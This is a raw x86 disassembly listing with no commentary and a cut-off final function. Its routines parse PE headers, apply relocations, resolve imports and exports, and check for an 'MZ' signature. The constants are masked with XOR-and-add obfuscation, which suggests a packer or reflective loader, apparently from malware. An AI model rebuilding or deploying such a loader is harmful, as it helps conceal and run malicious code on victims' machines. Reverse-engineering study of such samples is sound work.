  425947:	test   edx,edx
  425949:	jne    0x4258c7
  42594f:	mov    eax,DWORD PTR [ebp-0x10]
  425952:	mov    DWORD PTR [ebp-0x6c],eax
  425955:	mov    DWORD PTR [ebp-0x70],0x4
  42595c:	mov    eax,DWORD PTR [ecx+0x50]
  42595f:	mov    DWORD PTR [ebp-0x68],eax
  425962:	mov    eax,DWORD PTR [ebp-0x1c]
  425965:	xor    eax,esi
  425967:	add    eax,edi
  425969:	mov    DWORD PTR [ebp-0x64],eax
  42596c:	lea    eax,[ebp-0x20]
  42596f:	mov    DWORD PTR [ebp-0x60],eax
  425972:	lea    eax,[ebp-0x70]
  425975:	push   eax
  425976:	mov    eax,DWORD PTR [ebp+0x8]
  425979:	xor    eax,esi
  42597b:	add    eax,edi
  42597d:	push   eax
  42597e:	mov    eax,DWORD PTR [ebp+0x20]
  425981:	add    eax,0xee
  425986:	push   eax
  425987:	mov    eax,DWORD PTR [ebp+0x20]
  42598a:	mov    eax,DWORD PTR [eax+0x198]
  425990:	push   DWORD PTR [eax]
  425992:	mov    eax,DWORD PTR [ebp+0x10]
  425995:	call   eax
  425997:	mov    eax,DWORD PTR [ebp+0x20]
  42599a:	mov    eax,DWORD PTR [eax+0x180]
  4259a0:	add    eax,DWORD PTR [ebp+0xc]
  4259a3:	mov    ecx,DWORD PTR [ebp+0xc]
  4259a6:	push   DWORD PTR [ebp+0x18]
  4259a9:	mov    DWORD PTR [eax],ecx
  4259ab:	push   DWORD PTR [ebp+0x14]
  4259ae:	push   DWORD PTR [ebp+0x1c]
  4259b1:	call   ebx
  4259b3:	mov    ecx,DWORD PTR [ebp+0xc]
  4259b6:	add    ecx,DWORD PTR [ebp+0x20]
  4259b9:	lea    eax,[ebp+0x4]
  4259bc:	mov    DWORD PTR [ebp+0x20],ecx
  4259bf:	mov    ecx,DWORD PTR [ebp+0x20]
  4259c2:	mov    ecx,DWORD PTR [ebp+0x20]
  4259c5:	mov    edx,DWORD PTR [ecx+0x190]
  4259cb:	mov    ecx,DWORD PTR [ebp+0x20]
  4259ce:	mov    ecx,DWORD PTR [ecx+0x18c]
  4259d4:	mov    esi,DWORD PTR [ecx]
  4259d6:	cmp    DWORD PTR [eax],esi
  4259d8:	jb     0x4259f9
  4259da:	mov    esi,DWORD PTR [edx]
  4259dc:	mov    edi,DWORD PTR [edx]
  4259de:	mov    esi,DWORD PTR [esi+0x3c]
  4259e1:	lea    esi,[edi+esi*1+0x50]
  4259e5:	mov    edi,DWORD PTR [ecx]
  4259e7:	add    edi,DWORD PTR [esi]
  4259e9:	cmp    DWORD PTR [eax],edi
  4259eb:	jae    0x4259f9
  4259ed:	mov    esi,DWORD PTR [ecx]
  4259ef:	mov    ecx,DWORD PTR [eax]
  4259f1:	mov    edx,DWORD PTR [edx]
  4259f3:	sub    ecx,esi
  4259f5:	add    edx,ecx
  4259f7:	mov    DWORD PTR [eax],edx
  4259f9:	mov    eax,DWORD PTR [ebp+0xc]
  4259fc:	jmp    0x425a00
  4259fe:	xor    eax,eax
  425a00:	pop    edi
  425a01:	pop    esi
  425a02:	pop    ebx
  425a03:	leave  
  425a04:	ret    0x1c
  425a07:	push   ebp
  425a08:	mov    ebp,esp
  425a0a:	sub    esp,0x1c
  425a0d:	push   esi
  425a0e:	mov    esi,eax
  425a10:	mov    eax,DWORD PTR [ecx+0x190]
  425a16:	cmp    DWORD PTR [eax],0x0
  425a19:	je     0x425b29
  425a1f:	test   edx,edx
  425a21:	je     0x425b29
  425a27:	test   esi,esi
  425a29:	je     0x425b29
  425a2f:	mov    eax,DWORD PTR [esi+0x88]
  425a35:	test   eax,eax
  425a37:	je     0x425b24
  425a3d:	cmp    DWORD PTR [esi+0x8c],0x10
  425a44:	je     0x425b24
  425a4a:	cmp    DWORD PTR [esi+0x34],edx
  425a4d:	je     0x425b24
  425a53:	mov    esi,DWORD PTR [ecx+0x18c]
  425a59:	and    DWORD PTR [ebp-0x10],0x0
  425a5d:	mov    ecx,edx
  425a5f:	sub    ecx,DWORD PTR [esi]
  425a61:	add    eax,edx
  425a63:	movzx  edx,WORD PTR [eax+0xc]
  425a67:	mov    DWORD PTR [ebp-0x1c],ecx
  425a6a:	movzx  ecx,WORD PTR [eax+0xe]
  425a6e:	add    ecx,edx
  425a70:	je     0x425b24
  425a76:	lea    ecx,[eax+0x14]
  425a79:	push   ebx
  425a7a:	mov    DWORD PTR [ebp-0x18],ecx
  425a7d:	mov    esi,0x7fffffff
  425a82:	push   edi
  425a83:	test   DWORD PTR [ecx],esi
  425a85:	je     0x425b06
  425a87:	mov    edx,DWORD PTR [ecx]
  425a89:	and    DWORD PTR [ebp-0xc],0x0
  425a8d:	and    edx,esi
  425a8f:	add    edx,eax
  425a91:	movzx  edi,WORD PTR [edx+0xe]
  425a95:	movzx  ebx,WORD PTR [edx+0xc]
  425a99:	add    edi,ebx
  425a9b:	je     0x425b06
  425a9d:	lea    ecx,[edx+0x14]
  425aa0:	mov    DWORD PTR [ebp-0x14],ecx
  425aa3:	test   DWORD PTR [ecx],esi
  425aa5:	je     0x425ae8
  425aa7:	mov    ecx,DWORD PTR [ecx]
  425aa9:	and    DWORD PTR [ebp-0x8],0x0
  425aad:	and    ecx,esi
  425aaf:	add    ecx,eax
  425ab1:	movzx  edi,WORD PTR [ecx+0xe]
  425ab5:	movzx  ebx,WORD PTR [ecx+0xc]
  425ab9:	add    edi,ebx
  425abb:	je     0x425ae8
  425abd:	lea    edi,[ecx+0x14]
  425ac0:	mov    DWORD PTR [ebp-0x4],edi
  425ac3:	mov    edi,DWORD PTR [ebp-0x4]
  425ac6:	mov    edi,DWORD PTR [edi]
  425ac8:	test   edi,edi
  425aca:	je     0x425ad2
  425acc:	mov    ebx,DWORD PTR [ebp-0x1c]
  425acf:	add    DWORD PTR [edi+eax*1],ebx
  425ad2:	movzx  edi,WORD PTR [ecx+0xe]
  425ad6:	movzx  ebx,WORD PTR [ecx+0xc]
  425ada:	inc    DWORD PTR [ebp-0x8]
  425add:	add    DWORD PTR [ebp-0x4],0x8
  425ae1:	add    edi,ebx
  425ae3:	cmp    DWORD PTR [ebp-0x8],edi
  425ae6:	jb     0x425ac3
  425ae8:	movzx  edi,WORD PTR [edx+0xe]
  425aec:	movzx  ebx,WORD PTR [edx+0xc]
  425af0:	mov    ecx,DWORD PTR [ebp-0x14]
  425af3:	inc    DWORD PTR [ebp-0xc]
  425af6:	add    ecx,0x8
  425af9:	add    edi,ebx
  425afb:	mov    DWORD PTR [ebp-0x14],ecx
  425afe:	cmp    DWORD PTR [ebp-0xc],edi
  425b01:	jb     0x425aa3
  425b03:	mov    ecx,DWORD PTR [ebp-0x18]
  425b06:	movzx  edx,WORD PTR [eax+0xe]
  425b0a:	movzx  edi,WORD PTR [eax+0xc]
  425b0e:	inc    DWORD PTR [ebp-0x10]
  425b11:	add    ecx,0x8
  425b14:	add    edx,edi
  425b16:	mov    DWORD PTR [ebp-0x18],ecx
  425b19:	cmp    DWORD PTR [ebp-0x10],edx
  425b1c:	jb     0x425a83
  425b22:	pop    edi
  425b23:	pop    ebx
  425b24:	xor    eax,eax
  425b26:	inc    eax
  425b27:	jmp    0x425b2b
  425b29:	xor    eax,eax
  425b2b:	pop    esi
  425b2c:	leave  
  425b2d:	ret    
  425b2e:	push   ebp
  425b2f:	mov    ebp,esp
  425b31:	mov    ecx,DWORD PTR [ecx+0x190]
  425b37:	mov    eax,DWORD PTR [ebp+0xc]
  425b3a:	sub    esp,0x10
  425b3d:	push   ebx
  425b3e:	xor    ebx,ebx
  425b40:	push   esi
  425b41:	push   edi
  425b42:	cmp    DWORD PTR [ecx],ebx
  425b44:	je     0x425bcc
  425b4a:	cmp    eax,ebx
  425b4c:	je     0x425bcc
  425b4e:	cmp    DWORD PTR [eax+0x78],ebx
  425b51:	jne    0x425b58
  425b53:	xor    eax,eax
  425b55:	inc    eax
  425b56:	jmp    0x425bce
  425b58:	mov    eax,DWORD PTR [eax+0x78]
  425b5b:	add    eax,DWORD PTR [ebp+0x8]
  425b5e:	mov    ecx,DWORD PTR [eax+0x1c]
  425b61:	mov    edx,DWORD PTR [eax+0x24]
  425b64:	mov    esi,DWORD PTR [eax+0x14]
  425b67:	mov    edi,DWORD PTR [eax+0x18]
  425b6a:	add    ecx,DWORD PTR [ebp+0x8]
  425b6d:	add    edx,DWORD PTR [ebp+0x8]
  425b70:	mov    DWORD PTR [ebp-0x4],esi
  425b73:	cmp    esi,edi
  425b75:	ja     0x425b7a
  425b77:	mov    DWORD PTR [ebp-0x4],edi
  425b7a:	mov    DWORD PTR [ebp-0x8],ebx
  425b7d:	cmp    DWORD PTR [ebp-0x4],ebx
  425b80:	jbe    0x425b53
  425b82:	cmp    ebx,DWORD PTR [eax+0x14]
  425b85:	jae    0x425b8d
  425b87:	movzx  esi,WORD PTR [edx+ebx*2]
  425b8b:	jmp    0x425b8f
  425b8d:	mov    esi,ebx
  425b8f:	lea    esi,[ecx+esi*4]
  425b92:	mov    edi,DWORD PTR [esi]
  425b94:	test   edi,edi
  425b96:	je     0x425bc1
  425b98:	add    edi,DWORD PTR [ebp+0x8]
  425b9b:	mov    DWORD PTR [ebp-0x10],edi
  425b9e:	cmp    edi,eax
  425ba0:	jbe    0x425bb2
  425ba2:	mov    ebx,DWORD PTR [ebp+0xc]
  425ba5:	mov    ebx,DWORD PTR [ebx+0x7c]
  425ba8:	add    ebx,eax
  425baa:	cmp    edi,ebx
  425bac:	jae    0x425bb2
  425bae:	mov    esi,DWORD PTR [esi]
  425bb0:	jmp    0x425bba
  425bb2:	sub    edi,DWORD PTR [ebp+0x8]
  425bb5:	mov    DWORD PTR [esi],edi
  425bb7:	mov    esi,DWORD PTR [ebp-0x10]
  425bba:	test   esi,esi
  425bbc:	je     0x425bcc
  425bbe:	mov    ebx,DWORD PTR [ebp-0x8]
  425bc1:	inc    ebx
  425bc2:	mov    DWORD PTR [ebp-0x8],ebx
  425bc5:	cmp    ebx,DWORD PTR [ebp-0x4]
  425bc8:	jb     0x425b82
  425bca:	jmp    0x425b53
  425bcc:	xor    eax,eax
  425bce:	pop    edi
  425bcf:	pop    esi
  425bd0:	pop    ebx
  425bd1:	leave  
  425bd2:	ret    0x8
  425bd5:	push   ebp
  425bd6:	mov    ebp,esp
  425bd8:	sub    esp,0x2c
  425bdb:	mov    edx,0xf89c85a5
  425be0:	mov    DWORD PTR [ebp-0x4],edx
  425be3:	mov    DWORD PTR [ebp-0x8],0xf89c85a4
  425bea:	mov    eax,DWORD PTR [ebp-0x4]
  425bed:	mov    ecx,DWORD PTR [ebp-0x4]
  425bf0:	mov    ecx,DWORD PTR [ebp-0x4]
  425bf3:	mov    ecx,DWORD PTR [ebp-0x4]
  425bf6:	mov    ecx,DWORD PTR [ebp-0x4]
  425bf9:	mov    ecx,DWORD PTR [ebp-0x4]
  425bfc:	push   ebx
  425bfd:	mov    ebx,DWORD PTR [ebp+0x10]
  425c00:	push   esi
  425c01:	mov    esi,0x75108af
  425c06:	mov    DWORD PTR [ebp-0x10],0x352eb2f
  425c0d:	mov    ecx,DWORD PTR [ebp-0x4]
  425c10:	mov    ebx,DWORD PTR [ebx+0x190]
  425c16:	push   edi
  425c17:	mov    edi,0x3272f6
  425c1c:	xor    ecx,esi
  425c1e:	xor    eax,esi
  425c20:	add    eax,edi
  425c22:	add    ecx,edi
  425c24:	mov    DWORD PTR [ebp-0x18],eax
  425c27:	cmp    ecx,DWORD PTR [ebx]
  425c29:	je     0x425eaa
  425c2f:	mov    ebx,DWORD PTR [ebp-0x4]
  425c32:	mov    ecx,DWORD PTR [ebp+0xc]
  425c35:	xor    ebx,esi
  425c37:	add    ebx,edi
  425c39:	cmp    ebx,ecx
  425c3b:	je     0x425eaa
  425c41:	mov    ebx,DWORD PTR [ebp-0x4]
  425c44:	mov    ecx,DWORD PTR [ecx+0x80]
  425c4a:	xor    ebx,esi
  425c4c:	add    ebx,edi
  425c4e:	cmp    ecx,ebx
  425c50:	je     0x425ea5
  425c56:	add    ecx,DWORD PTR [ebp+0x8]
  425c59:	mov    DWORD PTR [ebp-0x2c],ecx
  425c5c:	mov    ebx,edx
  425c5e:	xor    ebx,esi
  425c60:	add    ebx,edi
  425c62:	mov    DWORD PTR [ebp-0x10],ebx
  425c65:	mov    ebx,DWORD PTR [ebp-0x10]
  425c68:	cmp    ebx,edx
  425c6a:	je     0x425c7e
  425c6c:	mov    edx,DWORD PTR [ebp-0x10]
  425c6f:	mov    ebx,DWORD PTR [ebp-0x4]
  425c72:	imul   edx,edx,0x14
  425c75:	xor    ebx,esi
  425c77:	add    ebx,edi
  425c79:	cmp    DWORD PTR [edx+ecx*1],ebx
  425c7c:	jne    0x425c95
  425c7e:	mov    edx,DWORD PTR [ebp-0x10]
  425c81:	mov    ebx,DWORD PTR [ebp-0x4]
  425c84:	imul   edx,edx,0x14
  425c87:	xor    ebx,esi
  425c89:	add    ebx,edi
  425c8b:	cmp    DWORD PTR [edx+ecx*1+0x10],ebx
  425c8f:	je     0x425e97
  425c95:	mov    eax,DWORD PTR [ebp-0x4]
  425c98:	mov    ebx,DWORD PTR [ebp-0x4]
  425c9b:	mov    eax,DWORD PTR [ebp-0x10]
  425c9e:	imul   eax,eax,0x14
  425ca1:	add    eax,ecx
  425ca3:	mov    ecx,DWORD PTR [eax+0x10]
  425ca6:	add    ecx,DWORD PTR [ebp+0x8]
  425ca9:	xor    ebx,esi
  425cab:	mov    DWORD PTR [ebp-0x1c],ecx
  425cae:	mov    ecx,DWORD PTR [ebp-0x4]
  425cb1:	mov    edx,DWORD PTR [ebp-0x4]
  425cb4:	xor    ecx,esi
  425cb6:	add    ecx,edi
  425cb8:	xor    edx,esi
  425cba:	mov    DWORD PTR [ebp-0x24],ecx
  425cbd:	mov    ecx,DWORD PTR [eax]
  425cbf:	add    edx,edi
  425cc1:	add    ebx,edi
  425cc3:	cmp    ecx,edx
  425cc5:	je     0x425ccd
  425cc7:	add    ecx,DWORD PTR [ebp+0x8]
  425cca:	mov    DWORD PTR [ebp-0x24],ecx
  425ccd:	mov    ecx,DWORD PTR [ebp-0x4]
  425cd0:	xor    ecx,esi
  425cd2:	add    ecx,DWORD PTR [eax+0xc]
  425cd5:	mov    eax,DWORD PTR [ebp+0x8]
  425cd8:	lea    eax,[ecx+eax*1+0x3272f6]
  425cdf:	mov    DWORD PTR [ebp+0xc],eax
  425ce2:	mov    DWORD PTR [ebp-0x28],0xf89c85a0
  425ce9:	mov    eax,DWORD PTR [ebp+0x10]
  425cec:	push   DWORD PTR [ebp+0xc]
  425cef:	mov    eax,DWORD PTR [eax+0x1e0]
  425cf5:	call   DWORD PTR [eax]
  425cf7:	mov    ecx,DWORD PTR [ebp-0x4]
  425cfa:	xor    ecx,esi
  425cfc:	add    ecx,edi
  425cfe:	mov    DWORD PTR [ebp-0xc],eax
  425d01:	cmp    ecx,eax
  425d03:	jne    0x425d17
  425d05:	mov    eax,DWORD PTR [ebp+0x10]
  425d08:	push   DWORD PTR [ebp+0xc]
  425d0b:	mov    eax,DWORD PTR [eax+0x1e0]
  425d11:	call   DWORD PTR [eax+0xc]
  425d14:	mov    DWORD PTR [ebp-0xc],eax
  425d17:	mov    DWORD PTR [ebp-0x20],0x7f661b2c
  425d1e:	mov    DWORD PTR [ebp-0x20],0xf89c985c
  425d25:	mov    eax,DWORD PTR [ebp-0x4]
  425d28:	xor    eax,esi
  425d2a:	add    eax,edi
  425d2c:	cmp    eax,DWORD PTR [ebp-0xc]
  425d2f:	jne    0x425d54
  425d31:	mov    eax,DWORD PTR [ebp-0x8]
  425d34:	mov    ecx,DWORD PTR [ebp-0x20]
  425d37:	xor    eax,esi
  425d39:	xor    ecx,esi
  425d3b:	lea    ebx,[ebx+eax*1+0x3272f6]
  425d42:	mov    eax,DWORD PTR [ebp+0x10]
  425d45:	mov    eax,DWORD PTR [eax+0x1e0]
  425d4b:	add    ecx,edi
  425d4d:	imul   ecx,ebx
  425d50:	push   ecx
  425d51:	call   DWORD PTR [eax+0x24]
  425d54:	mov    eax,DWORD PTR [ebp-0x4]
  425d57:	xor    eax,esi
  425d59:	add    eax,edi
  425d5b:	cmp    eax,DWORD PTR [ebp-0xc]
  425d5e:	jne    0x425d6f
  425d60:	mov    eax,DWORD PTR [ebp-0x28]
  425d63:	xor    eax,esi
  425d65:	add    eax,edi
  425d67:	cmp    ebx,eax
  425d69:	jbe    0x425ce9
  425d6f:	mov    eax,DWORD PTR [ebp-0x4]
  425d72:	xor    eax,esi
  425d74:	add    eax,edi
  425d76:	cmp    eax,DWORD PTR [ebp-0xc]
  425d79:	jne    0x425d92
  425d7b:	mov    eax,DWORD PTR [ebp-0x8]
  425d7e:	mov    ecx,DWORD PTR [ebp-0x18]
  425d81:	xor    eax,esi
  425d83:	lea    eax,[ecx+eax*1+0x3272f6]
  425d8a:	mov    DWORD PTR [ebp-0x18],eax
  425d8d:	jmp    0x425e81
  425d92:	mov    DWORD PTR [ebp-0x14],0x1121b2d
  425d99:	mov    DWORD PTR [ebp+0xc],0xe042d2f
  425da0:	mov    ebx,DWORD PTR [ebp-0x4]
  425da3:	xor    ebx,esi
  425da5:	add    ebx,edi
  425da7:	jmp    0x425e6e
  425dac:	mov    eax,DWORD PTR [ebp-0x4]
  425daf:	xor    eax,esi
  425db1:	add    eax,edi
  425db3:	mov    DWORD PTR [ebp-0x14],eax
  425db6:	mov    eax,DWORD PTR [ebp-0x4]
  425db9:	xor    eax,esi
  425dbb:	add    eax,edi
  425dbd:	mov    DWORD PTR [ebp+0xc],eax
  425dc0:	mov    ecx,DWORD PTR [ebp-0x4]
  425dc3:	mov    eax,DWORD PTR [ebp-0x24]
  425dc6:	xor    ecx,esi
  425dc8:	add    ecx,edi
  425dca:	cmp    ecx,eax
  425dcc:	je     0x425dd4
  425dce:	mov    eax,DWORD PTR [eax+ebx*4]
  425dd1:	mov    DWORD PTR [ebp-0x14],eax
  425dd4:	mov    eax,DWORD PTR [ebp-0x1c]
  425dd7:	mov    eax,DWORD PTR [eax+ebx*4]
  425dda:	mov    DWORD PTR [ebp+0xc],eax
  425ddd:	mov    eax,DWORD PTR [ebp-0x4]
  425de0:	mov    ecx,DWORD PTR [ebp-0x14]
  425de3:	xor    eax,esi
  425de5:	add    eax,edi
  425de7:	cmp    eax,ecx
  425de9:	je     0x425e14
  425deb:	mov    eax,DWORD PTR [ebp-0x4]
  425dee:	mov    ecx,DWORD PTR [ebp-0x14]
  425df1:	xor    eax,esi
  425df3:	add    eax,edi
  425df5:	shr    ecx,0x1f
  425df8:	cmp    eax,ecx
  425dfa:	je     0x425e14
  425dfc:	mov    ecx,DWORD PTR [ebp-0x14]
  425dff:	mov    eax,DWORD PTR [ebp+0x10]
  425e02:	mov    eax,DWORD PTR [eax+0x1e0]
  425e08:	movzx  ecx,cx
  425e0b:	push   ecx
  425e0c:	push   DWORD PTR [ebp-0xc]
  425e0f:	call   DWORD PTR [eax+0x8]
  425e12:	jmp    0x425e2d
  425e14:	mov    eax,DWORD PTR [ebp+0xc]
  425e17:	add    eax,DWORD PTR [ebp+0x8]
  425e1a:	mov    ecx,DWORD PTR [ebp+0x10]
  425e1d:	mov    ecx,DWORD PTR [ecx+0x1e0]
  425e23:	add    eax,0x2
  425e26:	push   eax
  425e27:	push   DWORD PTR [ebp-0xc]
  425e2a:	call   DWORD PTR [ecx+0x8]
  425e2d:	mov    DWORD PTR [ebp+0xc],eax
  425e30:	mov    eax,DWORD PTR [ebp-0x4]
  425e33:	mov    ecx,DWORD PTR [ebp+0xc]
  425e36:	xor    eax,esi
  425e38:	add    eax,edi
  425e3a:	cmp    eax,ecx
  425e3c:	mov    eax,DWORD PTR [ebp-0x8]
  425e3f:	jne    0x425e52
  425e41:	mov    ecx,DWORD PTR [ebp-0x18]
  425e44:	xor    eax,esi
  425e46:	lea    eax,[ecx+eax*1+0x3272f6]
  425e4d:	mov    DWORD PTR [ebp-0x18],eax
  425e50:	jmp    0x425e62
  425e52:	mov    ecx,DWORD PTR [ebp+0xc]
  425e55:	xor    eax,esi
  425e57:	add    eax,edi
  425e59:	imul   eax,ecx
  425e5c:	mov    ecx,DWORD PTR [ebp-0x1c]
  425e5f:	mov    DWORD PTR [ecx+ebx*4],eax
  425e62:	mov    eax,DWORD PTR [ebp-0x8]
  425e65:	xor    eax,esi
  425e67:	lea    ebx,[ebx+eax*1+0x3272f6]
  425e6e:	mov    eax,DWORD PTR [ebp-0x4]
  425e71:	mov    ecx,DWORD PTR [ebp-0x1c]
  425e74:	xor    eax,esi
  425e76:	add    eax,edi
  425e78:	cmp    DWORD PTR [ecx+ebx*4],eax
  425e7b:	jne    0x425dac
  425e81:	mov    edx,DWORD PTR [ebp-0x10]
  425e84:	mov    eax,DWORD PTR [ebp-0x18]
  425e87:	mov    ecx,DWORD PTR [ebp-0x2c]
  425e8a:	sub    edx,0x3272f5
  425e90:	xor    edx,esi
  425e92:	jmp    0x425c5c
  425e97:	mov    ecx,DWORD PTR [ebp-0x4]
  425e9a:	xor    ecx,esi
  425e9c:	add    ecx,edi
  425e9e:	cmp    eax,ecx
  425ea0:	mov    eax,DWORD PTR [ebp-0x4]
  425ea3:	jne    0x425ead
  425ea5:	mov    eax,DWORD PTR [ebp-0x8]
  425ea8:	jmp    0x425ead
  425eaa:	mov    eax,DWORD PTR [ebp-0x4]
  425ead:	xor    eax,esi
  425eaf:	add    eax,edi
  425eb1:	pop    edi
  425eb2:	pop    esi
  425eb3:	pop    ebx
  425eb4:	leave  
  425eb5:	ret    0xc
  425eb8:	push   ebp
  425eb9:	mov    ebp,esp
  425ebb:	sub    esp,0x28
  425ebe:	mov    DWORD PTR [ebp-0x4],0xf89c85a5
  425ec5:	mov    DWORD PTR [ebp-0x28],0xf89c85a4
  425ecc:	mov    eax,DWORD PTR [ebp+0xc]
  425ecf:	mov    DWORD PTR [ebp+0xc],eax
  425ed2:	push   esi
  425ed3:	mov    eax,eax
  425ed5:	mov    eax,DWORD PTR [ebp-0x4]
  425ed8:	mov    esi,DWORD PTR [ebp+0x8]
  425edb:	mov    ecx,0x75108af
  425ee0:	xor    eax,ecx
  425ee2:	mov    edx,0x3272f6
  425ee7:	add    eax,edx
  425ee9:	cmp    esi,eax
  425eeb:	je     0x426012
  425ef1:	mov    eax,DWORD PTR [ebp+0x8]
  425ef4:	mov    esi,DWORD PTR [ebp+0x8]
  425ef7:	add    esi,DWORD PTR [eax+0x3c]
  425efa:	push   edi
  425efb:	mov    DWORD PTR [ebp+0xc],esi
  425efe:	mov    DWORD PTR [ebp-0x1c],0xf89c85a0
  425f05:	mov    eax,DWORD PTR [ebp-0x1c]
  425f08:	mov    esi,DWORD PTR [ebp-0x4]
  425f0b:	mov    edi,DWORD PTR [ebp+0xc]
  425f0e:	xor    esi,ecx
  425f10:	xor    eax,ecx
  425f12:	add    esi,edx
  425f14:	cmp    DWORD PTR [edi+eax*8+0x1939828],esi
  425f1b:	je     0x42600c
  425f21:	mov    esi,DWORD PTR [ebp+0xc]
  425f24:	mov    eax,DWORD PTR [ebp+0x8]
  425f27:	add    eax,DWORD PTR [esi+0xa0]
  425f2d:	mov    esi,DWORD PTR [ebp+0x8]
  425f30:	mov    edi,DWORD PTR [ebp+0xc]
  425f33:	sub    esi,DWORD PTR [edi+0x34]
  425f36:	mov    edi,DWORD PTR [ebp-0x4]
  425f39:	xor    edi,ecx
  425f3b:	add    edi,edx
  425f3d:	mov    DWORD PTR [ebp-0x24],esi
  425f40:	cmp    esi,edi
  425f42:	je     0x42600c
  425f48:	mov    esi,DWORD PTR [ebp-0x4]
  425f4b:	xor    esi,ecx
  425f4d:	add    esi,edx
  425f4f:	mov    DWORD PTR [ebp-0x8],esi
  425f52:	push   ebx
  425f53:	mov    DWORD PTR [ebp-0x10],0xf89c85a2
  425f5a:	jmp    0x425ff6
  425f5f:	mov    esi,DWORD PTR [ebp-0x4]
  425f62:	xor    esi,ecx
  425f64:	lea    edi,[ebx-0x8]
  425f67:	add    esi,edx
  425f69:	shr    edi,1
  425f6b:	cmp    esi,edi
  425f6d:	jae    0x425fdc
  425f6f:	sub    edi,esi
  425f71:	lea    ebx,[eax+esi*2+0x8]
  425f75:	mov    DWORD PTR [ebp-0x18],edi
  425f78:	movzx  esi,WORD PTR [ebx]
  425f7b:	and    esi,0xfff
  425f81:	mov    DWORD PTR [ebp-0x14],esi
  425f84:	mov    edi,DWORD PTR [ebp-0x14]
  425f87:	mov    esi,DWORD PTR [eax]
  425f89:	sub    esi,edx
  425f8b:	add    edi,esi
  425f8d:	movzx  esi,WORD PTR [ebx]
  425f90:	shr    esi,0xc
  425f93:	xor    edi,ecx
  425f95:	mov    DWORD PTR [ebp-0x20],edi
  425f98:	mov    DWORD PTR [ebp-0x14],esi
  425f9b:	mov    esi,DWORD PTR [ebp-0x20]
  425f9e:	mov    edi,DWORD PTR [ebp+0x8]
  425fa1:	xor    esi,ecx
  425fa3:	lea    esi,[esi+edi*1+0x3272f6]
  425faa:	mov    DWORD PTR [ebp-0x20],esi
  425fad:	mov    esi,DWORD PTR [ebp-0x10]
  425fb0:	mov    edi,DWORD PTR [ebp-0x14]
  425fb3:	xor    esi,ecx
  425fb5:	add    esi,edx
  425fb7:	cmp    edi,esi
  425fb9:	jne    0x425fd1
  425fbb:	mov    esi,DWORD PTR [ebp-0x10]
  425fbe:	mov    edi,DWORD PTR [ebp-0x14]
  425fc1:	xor    esi,ecx
  425fc3:	add    esi,edx
  425fc5:	cmp    edi,esi
  425fc7:	jne    0x425fd1
  425fc9:	mov    esi,DWORD PTR [ebp-0x20]
  425fcc:	mov    edi,DWORD PTR [ebp-0x24]
  425fcf:	add    DWORD PTR [esi],edi
  425fd1:	add    ebx,0x2
  425fd4:	dec    DWORD PTR [ebp-0x18]
  425fd7:	jne    0x425f78
  425fd9:	mov    ebx,DWORD PTR [ebp-0xc]
  425fdc:	add    DWORD PTR [ebp-0x8],ebx
  425fdf:	mov    esi,DWORD PTR [ebp-0x1c]
  425fe2:	mov    edi,DWORD PTR [ebp-0x8]
  425fe5:	mov    ebx,DWORD PTR [ebp+0xc]
  425fe8:	xor    esi,ecx
  425fea:	cmp    edi,DWORD PTR [ebx+esi*8+0x193982c]
  425ff1:	jae    0x42600b
  425ff3:	add    eax,DWORD PTR [ebp-0xc]
  425ff6:	mov    esi,DWORD PTR [ebp-0x4]
  425ff9:	mov    ebx,DWORD PTR [eax+0x4]
  425ffc:	xor    esi,ecx
  425ffe:	add    esi,edx
  426000:	mov    DWORD PTR [ebp-0xc],ebx
  426003:	cmp    ebx,esi
  426005:	jne    0x425f5f
  42600b:	pop    ebx
  42600c:	mov    eax,DWORD PTR [ebp-0x28]
  42600f:	pop    edi
  426010:	jmp    0x426015
  426012:	mov    eax,DWORD PTR [ebp-0x4]
  426015:	xor    eax,ecx
  426017:	add    eax,edx
  426019:	pop    esi
  42601a:	leave  
  42601b:	ret    0x8
  42601e:	push   ebp
  42601f:	mov    ebp,esp
  426021:	sub    esp,0xd8
  426027:	mov    DWORD PTR [ebp-0x4],0xf89c85a5
  42602e:	mov    DWORD PTR [ebp-0x24],0xf89c85a4
  426035:	mov    eax,DWORD PTR [ebp-0x4]
  426038:	push   ebx
  426039:	push   esi
  42603a:	mov    esi,0x75108af
  42603f:	xor    eax,esi
  426041:	push   edi
  426042:	mov    edi,0x3272f6
  426047:	add    eax,edi
  426049:	mov    DWORD PTR [ebp-0x18],eax
  42604c:	mov    eax,DWORD PTR [ebp-0x4]
  42604f:	xor    eax,esi
  426051:	add    eax,edi
  426053:	mov    DWORD PTR [ebp-0x8],eax
  426056:	mov    ebx,DWORD PTR [ebp+0x20]
  426059:	mov    eax,DWORD PTR [ebp-0x1c]
  42605c:	mov    ecx,DWORD PTR [ebp-0x1c]
  42605f:	xor    eax,ecx
  426061:	mov    DWORD PTR [ebp-0x1c],eax
  426064:	add    DWORD PTR [ebp-0x1c],0xf89cb5a5
  42606b:	mov    eax,DWORD PTR [ebp-0xc]
  42606e:	mov    ecx,DWORD PTR [ebp-0xc]
  426071:	xor    eax,ecx
  426073:	mov    DWORD PTR [ebp-0xc],eax
  426076:	add    DWORD PTR [ebp-0xc],0xf89c85e5
  42607d:	mov    eax,DWORD PTR [ebp-0x10]
  426080:	mov    ecx,DWORD PTR [ebp-0x10]
  426083:	xor    eax,ecx
  426085:	mov    DWORD PTR [ebp-0x10],eax
  426088:	add    DWORD PTR [ebp-0x10],0xf89c85a1
  42608f:	mov    eax,DWORD PTR [ebp-0x28]
  426092:	mov    ecx,DWORD PTR [ebp-0x28]
  426095:	xor    eax,ecx
  426097:	mov    DWORD PTR [ebp-0x28],eax
  42609a:	add    DWORD PTR [ebp-0x28],0xf89f05a5
  4260a1:	mov    DWORD PTR [ebp+0x20],0xf89ceff8
  4260a8:	mov    eax,DWORD PTR [ebp+0x8]
  4260ab:	test   eax,eax
  4260ad:	je     0x426534
  4260b3:	mov    eax,DWORD PTR [ebp+0xc]
  4260b6:	test   eax,eax
  4260b8:	je     0x426534
  4260be:	mov    eax,DWORD PTR [ebp+0x18]
  4260c1:	test   eax,eax
  4260c3:	je     0x426534
  4260c9:	mov    eax,DWORD PTR [ebp+0x20]
  4260cc:	mov    ecx,DWORD PTR [ebp+0x8]
  4260cf:	xor    eax,0x8af
  4260d4:	add    eax,0x72f6
  4260d9:	cmp    WORD PTR [ecx],ax
  4260dc:	jne    0x426534
  4260e2:	mov    eax,DWORD PTR [ebp-0x4]
  4260e5:	xor    eax,esi
  4260e7:	add    eax,edi
  4260e9:	mov    DWORD PTR [ebp-0x30],eax
  4260ec:	mov    eax,DWORD PTR [ebp-0x4]
  4260ef:	mov    ecx,DWORD PTR [ebp+0x8]
